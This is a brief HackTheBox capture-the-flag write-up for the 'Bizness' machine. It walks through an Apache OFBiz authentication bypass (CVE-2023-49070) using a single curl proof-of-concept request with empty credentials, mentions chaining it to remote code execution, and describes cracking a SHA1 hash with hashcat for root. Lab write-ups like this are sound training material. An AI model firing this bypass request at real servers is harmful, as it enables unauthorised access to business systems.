---
TitleSEO:    "HackTheBox Bizness Writeup | ZureFX"
TitlePost:   "HTB Bizness — Easy Linux"
Author:      "ZureFX"
Description: "HackTheBox Bizness writeup. Apache OFBiz authentication bypass CVE-2023-49070 and SHA1 hash cracking for root."
Keywords:    "hackthebox, bizness, writeup, ofbiz, cve-2023-49070, linux"
URL:         "https://zurefx.github.io/writeups/htb-bizness.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-bizness/"
Date:        "2026-03-14"
Tags:        "HackTheBox, Easy, Linux, OFBiz, AuthBypass"
Section:     "writeups"
Lang:        "en"
main_img:    "htb-bizness"
Permalink:   "/writeups/htb-bizness.html"
BtnLabel:    "Read Writeup"
---

## Enumeration

```
443/tcp open  https  Apache OFBiz
```

## Exploitation — CVE-2023-49070

Auth bypass via XML-RPC endpoint. PoC:

```bash
curl -k "https://target/webtools/control/main?USERNAME=&PASSWORD=&requirePasswordChange=Y"
# → redirects to dashboard without auth
```

Chained with CVE-2023-51467 for RCE.

## Privilege Escalation

Found SHA1 hash in Derby database:

```
$SHA$d$hash_value
```

Cracked with hashcat mode 120, recovered root password.
